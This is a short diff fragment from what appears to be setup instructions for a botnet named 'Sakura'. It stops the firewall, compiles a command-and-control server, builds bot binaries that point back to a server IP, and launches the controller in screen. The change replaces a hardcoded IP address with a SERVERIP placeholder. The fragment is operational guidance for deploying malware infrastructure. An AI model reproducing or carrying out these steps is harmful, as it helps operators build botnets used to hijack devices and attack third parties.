@@ -33,7 +33,7 @@ service httpd restart; service iptables stop
 
 gcc Sakura_CNC.c -o Sakura -pthread
 
-python Sakura_Build.py Sakura_Bot.c 137.184.27.175
+python Sakura_Build.py Sakura_Bot.c SERVERIP
 
 screen ./Sakura 606 1 909
 --------------------------------------------------------------------
